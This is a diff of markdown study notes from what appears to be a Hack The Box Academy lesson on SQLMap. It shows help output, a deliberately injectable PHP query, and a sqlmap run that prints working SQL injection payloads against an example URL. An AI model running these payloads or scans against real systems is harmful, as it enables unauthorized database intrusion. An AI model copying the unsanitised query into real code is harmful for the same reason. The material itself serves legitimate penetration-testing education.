@@ -3,87 +3,87 @@ sticker: lucide//database-backup
 ---
 Upon starting using SQLMap, the first stop for new users is usually the program's help message. To help new users, there are two levels of help message listing:
 
-- `Basic Listing`Â shows only the basic options and switches, sufficient in most cases (switchÂ `-h`):
+- `Basic Listing` shows only the basic options and switches, sufficient in most cases (switch`-h`):
 
 
 ```shell-session
 smoothment@htb[/htb]$ sqlmap -h
-        ___
-       __H__
- ___ ___[']_____ ___ ___  {1.4.9#stable}
-|_ -| . ["]     | .'| . |
-|___|_  [.]_|_|_|__,|  _|
-      |_|V...       |_|   http://sqlmap.org
+ ___
+ __H__
+ ___ ___[']_____ ___ ___ {1.4.9#stable}
+|_ -| . ["] | .'| . |
+|___|_ [.]_|_|_|__,| _|
+ |_|V... |_| http://sqlmap.org
 
 Usage: python3 sqlmap [options]
 
 Options:
-  -h, --help            Show basic help message and exit
-  -hh                   Show advanced help message and exit
-  --version             Show program's version number and exit
-  -v VERBOSE            Verbosity level: 0-6 (default 1)
+ -h, --help Show basic help message and exit
+ -hh Show advanced help message and exit
+ --version Show program's version number and exit
+ -v VERBOSE Verbosity level: 0-6 (default 1)
 
-  Target:
-    At least one of these options has to be provided to define the
-    target(s)
+ Target:
+ At least one of these options has to be provided to define the
+ target(s)
 
-    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
-    -g GOOGLEDORK       Process Google dork results as target URLs
+ -u URL, --url=URL Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+ -g GOOGLEDORK Process Google dork results as target URLs
 ...SNIP...
 ```
 
-- `Advanced Listing`Â shows all options and switches (switchÂ `-hh`):
+- `Advanced Listing` shows all options and switches (switch`-hh`):
 
 
 ```shell-session
 smoothment@htb[/htb]$ sqlmap -hh
-        ___
-       __H__
- ___ ___[)]_____ ___ ___  {1.4.9#stable}
-|_ -| . [.]     | .'| . |
-|___|_  [)]_|_|_|__,|  _|
-      |_|V...       |_|   http://sqlmap.org
+ ___
+ __H__
+ ___ ___[)]_____ ___ ___ {1.4.9#stable}
+|_ -| . [.] | .'| . |
+|___|_ [)]_|_|_|__,| _|
+ |_|V... |_| http://sqlmap.org
 
 Usage: python3 sqlmap [options]
 
 Options:
-  -h, --help            Show basic help message and exit
-  -hh                   Show advanced help message and exit
-  --version             Show program's version number and exit
-  -v VERBOSE            Verbosity level: 0-6 (default 1)
+ -h, --help Show basic help message and exit
+ -hh Show advanced help message and exit
+ --version Show program's version number and exit
+ -v VERBOSE Verbosity level: 0-6 (default 1)
 
-  Target:
-    At least one of these options has to be provided to define the
-    target(s)
+ Target:
+ At least one of these options has to be provided to define the
+ target(s)
 
-    -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
-    -d DIRECT           Connection string for direct database connection
-    -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
-    -m BULKFILE         Scan multiple targets given in a textual file
-    -r REQUESTFILE      Load HTTP request from a file
-    -g GOOGLEDORK       Process Google dork results as target URLs
-    -c CONFIGFILE       Load options from a configuration INI file
+ -u URL, --url=URL Target URL (e.g. "http://www.site.com/vuln.php?id=1")
+ -d DIRECT Connection string for direct database connection
+ -l LOGFILE Parse target(s) from Burp or WebScarab proxy log file
+ -m BULKFILE Scan multiple targets given in a textual file
+ -r REQUESTFILE Load HTTP request from a file
+ -g GOOGLEDORK Process Google dork results as target URLs
+ -c CONFIGFILE Load options from a configuration INI file
 
-  Request:
-    These options can be used to specify how to connect to the target URL
+ Request:
+ These options can be used to specify how to connect to the target URL
 
-    -A AGENT, --user..  HTTP User-Agent header value
-    -H HEADER, --hea..  Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
-    --method=METHOD     Force usage of given HTTP method (e.g. PUT)
-    --data=DATA         Data string to be sent through POST (e.g. "id=1")
-    --param-del=PARA..  Character used for splitting parameter values (e.g. &)
-    --cookie=COOKIE     HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
-    --cookie-del=COO..  Character used for splitting cookie values (e.g. ;)
+ -A AGENT, --user.. HTTP User-Agent header value
+ -H HEADER, --hea.. Extra header (e.g. "X-Forwarded-For: 127.0.0.1")
+ --method=METHOD Force usage of given HTTP method (e.g. PUT)
+ --data=DATA Data string to be sent through POST (e.g. "id=1")
+ --param-del=PARA.. Character used for splitting parameter values (e.g. &)
+ --cookie=COOKIE HTTP Cookie header value (e.g. "PHPSESSID=a8d127e..")
+ --cookie-del=COO.. Character used for splitting cookie values (e.g. ;)
 ...SNIP...
 ```
 
-For more details, users are advised to consult the project'sÂ [wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage), as it represents the official manual for SQLMap's usage.
+For more details, users are advised to consult the project's [wiki](https://github.com/sqlmapproject/sqlmap/wiki/Usage), as it represents the official manual for SQLMap's usage.
 
 ---
 
 ## Basic Scenario
 
-In a simple scenario, a penetration tester accesses the web page that accepts user input via aÂ `GET`Â parameter (e.g.,Â `id`). They then want to test if the web page is affected by the SQL injection vulnerability. If so, they would want to exploit it, retrieve as much information as possible from the back-end database, or even try to access the underlying file system and execute OS commands. An example SQLi vulnerable PHP code for this scenario would look as follows:
+In a simple scenario, a penetration tester accesses the web page that accepts user input via a`GET` parameter (e.g.,`id`). They then want to test if the web page is affected by the SQL injection vulnerability. If so, they would want to exploit it, retrieve as much information as possible from the back-end database, or even try to access the underlying file system and execute OS commands. An example SQLi vulnerable PHP code for this scenario would look as follows:
 
 
 ```php
@@ -91,25 +91,23 @@ $link = mysqli_connect($host, $username, $password, $database, 3306);
 $sql = "SELECT * FROM users WHERE id = " . $_GET["id"] . " LIMIT 0, 1";
 $result = mysqli_query($link, $sql);
 if (!$result)
-    die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
+ die("<b>SQL error:</b> ". mysqli_error($link) . "<br>\n");
 ```
 
 As error reporting is enabled for the vulnerable SQL query, there will be a database error returned as part of the web-server response in case of any SQL query execution problems. Such cases ease the process of SQLi detection, especially in case of manual parameter value tampering, as the resulting errors are easily recognized:
 
-Â Â Â 
+ ![](https://academy.hackthebox.com/storage/modules/58/rOrm8tC.png)
 
-![](https://academy.hackthebox.com/storage/modules/58/rOrm8tC.png)
-
-To run SQLMap against this example, located at the example URLÂ `http://www.example.com/vuln.php?id=1`, would look like the following:
+To run SQLMap against this example, located at the example URL`http://www.example.com/vuln.php?id=1`, would look like the following:
 
 ```shell-session
 smoothment@htb[/htb]$ sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
-        ___
-       __H__
- ___ ___[']_____ ___ ___  {1.4.9}
-|_ -| . [,]     | .'| . |
-|___|_  [(]_|_|_|__,|  _|
-      |_|V...       |_|   http://sqlmap.org
+ ___
+ __H__
+ ___ ___[']_____ ___ ___ {1.4.9}
+|_ -| . [,] | .'| . |
+|___|_ [(]_|_|_|__,| _|
+ |_|V... |_| http://sqlmap.org
 
 
 [*] starting @ 22:26:45 /2020-09-09/
@@ -134,7 +132,7 @@ for the remaining tests, do you want to include all tests for 'MySQL' extending 
 [22:26:46] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
 [22:26:46] [INFO] testing 'MySQL inline queries'
 [22:26:46] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
-[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done)                                                                                                       
+[22:26:46] [WARNING] time-based comparison requires larger statistical model, please wait........... (done) 
 ...SNIP...
 [22:26:46] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
 [22:26:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
@@ -147,21 +145,21 @@ GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any
 sqlmap identified the following injection point(s) with a total of 46 HTTP(s) requests:
 ---
 Parameter: id (GET)
-    Type: boolean-based blind
-    Title: AND boolean-based blind - WHERE or HAVING clause
-    Payload: id=1 AND 8814=8814
+ Type: boolean-based blind
+ Title: AND boolean-based blind - WHERE or HAVING clause
+ Payload: id=1 AND 8814=8814
 
-    Type: error-based
-    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
-    Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
+ Type: error-based
+ Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+ Payload: id=1 AND (SELECT 7744 FROM(SELECT COUNT(*),CONCAT(0x7170706a71,(SELECT (ELT(7744=7744,1))),0x71707a7871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)
 
-    Type: time-based blind
-    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
-    Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)
+ Type: time-based blind
+ Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+ Payload: id=1 AND (SELECT 3669 FROM (SELECT(SLEEP(5)))TIxJ)
 
-    Type: UNION query
-    Title: Generic UNION query (NULL) - 3 columns
-    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
+ Type: UNION query
+ Title: Generic UNION query (NULL) - 3 columns
+ Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x7170706a71,0x554d766a4d694850596b754f6f716250584a6d53485a52474a7979436647576e766a595374436e78,0x71707a7871)-- -
 ---
 [22:26:56] [INFO] the back-end DBMS is MySQL
 web application technology: PHP 5.2.6, Apache 2.2.9
